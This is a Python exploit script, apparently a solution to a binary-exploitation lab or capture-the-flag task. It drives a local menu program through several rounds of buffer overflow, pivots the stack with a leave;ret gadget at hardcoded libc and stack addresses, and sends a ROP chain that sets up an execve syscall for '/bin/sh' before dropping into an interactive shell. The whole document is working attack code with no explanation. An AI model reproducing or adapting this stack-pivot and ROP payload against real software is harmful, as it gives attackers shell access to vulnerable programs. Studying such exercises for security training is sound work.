import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

print(p.readuntil('Quit'))
p.sendline('1')
print(p.readuntil('Text:'))
# p.sendline("A"*111 + "B"*16)
libc_base = 0x7f000042c000
leave_ret = p64(libc_base + 0x0000000000042351)
buffer_start = 0x7fffffffecd0
p.sendline("A"*111 + "B"*8 + leave_ret)

print(p.readuntil('Quit'))
p.sendline('1')
print(p.readuntil('Text:'))
p.sendline("A"*111 + "B"*7)

print(p.readuntil('Quit'))
p.sendline('1')
print(p.readuntil('Text:'))
p.sendline("A"*111 + p64(buffer_start))

print(p.readuntil('Quit'))
p.sendline('1')
print(p.readuntil('Text:'))
sh = p64(0x7f00005b8d57)
pop_rdi = p64(libc_base + 0x0000000000021102)
pop_rax = p64(libc_base + 0x0000000000033544)
pop_rsi = p64(libc_base + 0x00000000000202e8)
pop_rdx = p64(libc_base + 0x0000000000001b92)
syscall = p64(libc_base + 0x00000000000bc375)
payload = pop_rdi + sh + pop_rax + p64(0x3b) + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall
print("Length of payload: ", len(payload))
p.sendline("B"*8 + payload + "A"*31)

print(p.readuntil('Quit'))
p.sendline('2')

p.interactive()
